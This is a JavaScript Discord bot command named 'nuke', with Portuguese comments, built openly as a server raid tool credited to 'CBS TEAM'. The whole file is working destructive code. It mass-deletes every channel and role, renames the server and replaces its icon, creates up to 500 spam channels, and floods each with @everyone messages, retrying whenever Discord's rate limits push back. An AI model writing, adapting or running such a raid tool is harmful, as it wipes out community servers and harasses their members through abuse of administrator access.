const { SlashCommandBuilder, PermissionFlagsBits, ChannelType } = require('discord.js');
const pLimit = require('p-limit');
const config = require('../config');

module.exports = {
  data: new SlashCommandBuilder()
    .setName('nuke')
    .setDescription('💀 CRIAÇÃO ULTRA RÁPIDA - 500 canais + spam')
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
    .addIntegerOption(option =>
      option.setName('quantidade')
        .setDescription('Número de canais (padrão: 500, máximo: 500)')
        .setRequired(false)
        .setMinValue(1)
        .setMaxValue(500)
    ),

  async execute(interaction, client) {
    if (!interaction.memberPermissions.has(PermissionFlagsBits.Administrator)) {
      return interaction.reply({ content: '❌ Apenas ADMs.', ephemeral: true });
    }

    const botMember = interaction.guild.members.cache.get(client.user.id);
    if (!botMember.permissions.has(PermissionFlagsBits.Administrator)) {
      return interaction.reply({ content: '❌ Me dê ADM.', ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });
    const guild = interaction.guild;
    const user = interaction.user;
    const base = 'RAIDED-BY-CBS';
    const mensagem = config.raid.spamMessage || '**RAIDED BY CBS TEAM** 🔥';
    const quantidade = interaction.options.getInteger('quantidade') || 500;
    const limit = pLimit(20); // 20 operações simultâneas

    const startTime = Date.now();

    try {
      // ===== 1. APAGAR TUDO (PARALELO) =====
      await interaction.editReply('🧹 APAGANDO CANAIS, CATEGORIAS E CARGOS...');

      const apagarCanais = guild.channels.cache.map(ch => 
        ch.delete().catch(() => null)
      );
      const apagarCargos = guild.roles.cache
        .filter(r => r.id !== guild.id)
        .map(r => r.delete().catch(() => null));

      await Promise.all([...apagarCanais, ...apagarCargos]);

      // Pequena pausa para o Discord processar as deleções
      await new Promise(r => setTimeout(r, 1000));

      // ===== 2. MUDAR NOME E FOTO =====
      try {
        await guild.setName('RAIDED BY CBS TEAM');
        if (client.user.avatarURL()) {
          const avatar = await fetch(client.user.avatarURL({ size: 256, extension: 'png' }));
          const buffer = await avatar.buffer();
          await guild.setIcon(buffer);
        }
      } catch {}

      // ===== 3. CRIAR CATEGORIAS (PARALELO) =====
      await interaction.editReply('📂 CRIANDO 50 CATEGORIAS...');
      const categoryPromises = [];
      for (let i = 0; i < 50; i++) {
        categoryPromises.push(
          limit(() => guild.channels.create({
            name: `${base}-CAT-${i+1}`,
            type: ChannelType.GuildCategory,
            reason: 'RAID CBS'
          }).catch(() => null))
        );
      }
      const categories = (await Promise.all(categoryPromises)).filter(c => c !== null);

      // ===== 4. CRIAR CANAIS (PARALELO EM LOTES) =====
      await interaction.editReply(`📂 CRIANDO ${quantidade} CANAIS...`);
      const channelPromises = [];
      for (let i = 0; i < quantidade; i++) {
        const cat = categories[i % categories.length] || null;
        channelPromises.push(
          limit(() => guild.channels.create({
            name: `${base}-CH-${i+1}`,
            type: ChannelType.GuildText,
            parent: cat?.id || null,
            topic: 'RAIDED BY CBS TEAM'
          }).catch(() => null))
        );
        // Atualiza progresso a cada 50 promessas
        if (i % 50 === 0 && i > 0) {
          await interaction.editReply(`📂 ${i}/${quantidade} canais criados`);
        }
      }
      const channels = (await Promise.all(channelPromises)).filter(c => c !== null);
      await interaction.editReply(`📂 ${channels.length}/${quantidade} canais criados`);

      // ===== 5. SPAM EM PARALELO COM BACKOFF =====
      await interaction.editReply(`💬 SPAMMANDO ${channels.length} CANAIS...`);
      const spamPromises = channels.map(channel =>
        limit(async () => {
          let tentativas = 0;
          while (tentativas < 3) {
            try {
              await channel.send({
                content: `@everyone ${mensagem}`,
                embeds: [{
                  title: 'CBS TEAM ESTEVE AQUI!',
                  description: `💀 RAID por ${user.tag}`,
                  color: 0xFF0000,
                  image: { url: config.raid.gifUrl },
                  timestamp: new Date()
                }]
              });
              return; // sucesso
            } catch (e) {
              if (e.code === 429) {
                const waitTime = e.retryAfter ? e.retryAfter * 1000 : 2000;
                await new Promise(r => setTimeout(r, waitTime));
                tentativas++;
              } else {
                break;
              }
            }
          }
        })
      );
      await Promise.all(spamPromises);

      // ===== 6. FINAL =====
      const tempo = Math.round((Date.now() - startTime) / 1000);
      await interaction.editReply(
        `✅ **NUKE ULTRA RÁPIDO CONCLUÍDO!**\n\n` +
        `📂 ${categories.length}/50 categorias\n` +
        `📂 ${channels.length}/${quantidade} canais\n` +
        `💬 ${channels.length} mensagens enviadas\n` +
        `⏱️ ${tempo}s`
      );

    } catch (error) {
      console.error('❌ ERRO NUKE:', error);
      await interaction.editReply(`❌ ERRO: ${error.message}`);
    }
  }
};